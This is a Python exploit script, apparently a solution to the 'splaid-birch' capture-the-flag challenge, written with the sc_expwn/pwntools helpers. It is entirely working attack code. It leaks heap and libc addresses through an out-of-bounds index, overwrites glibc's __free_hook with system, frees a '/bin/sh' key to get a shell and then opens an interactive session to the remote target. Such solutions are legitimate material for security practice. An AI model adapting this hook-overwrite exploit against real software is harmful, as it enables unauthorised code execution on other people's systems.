#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './splaid-birch'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'env':{'LD_LIBRARY_PATH':'.'}}, \
                        local   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}}, \
                        remote  = {'host':'splaid-birch.pwni.ng', 'port':17579})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        # remote  = 'libc.so.6')
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    if env.check('debug'):
        conn.recv()

    sb = SplaidBirch(conn)

    sb.add(1, 0x10)
    sb.add(2, 0x20)

    addr_heap_base = sb.get_by_idx(0x213) - 0x12f8
    sb.get_by_idx(0)
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for i in range(3, 160):
        sb.add(i, i*0x10)
        sb.delete(i)

    sb.add(160, 160*0x10)
    sb.add(161, addr_heap_base + 0x13b8)

    addr_libc_mainarena = sb.get_by_idx(-9) - 0x60
    sb.get_by_idx(0)
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_system        = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    sb.delete(161)
    sb.add(u('/bin/sh\x00'), addr_libc_free_hook - 0x10)
    sb.get_by_idx(-9)
    sb.arbitrary(addr_libc_system, 0, 0)
    sb.get_by_idx(0)
    
    sb.delete(u('/bin/sh\x00'))

class SplaidBirch:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def delete(self, key):
        self.sendline('1')
        self.sendline(str(key))

    def get_by_key(self, key):
        self.sendline('2')
        self.sendline(str(key))
        return int(self.recvuntil('\n', drop=True))

    def nth_key(self, n):
        self.sendline('3')
        self.sendline(str(n))
        return int(self.recvuntil('\n', drop=True))

    def get_by_idx(self, idx):
        self.sendline('4')
        self.sendline(str(idx))
        return int(self.recvuntil('\n', drop=True))

    def add(self, key, value):
        self.sendline('5')
        self.sendline(str(key))
        self.sendline(str(value))

    def sum(self, key1, key2):
        self.sendline('6')
        self.sendline(str(key1))
        self.sendline(str(key2))
        return int(self.recvuntil('\n', drop=True))

    def arbitrary(self, x, key1, key2):
        self.sendline('7')
        self.sendline(str(x))
        self.sendline(str(key1))
        self.sendline(str(key2))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
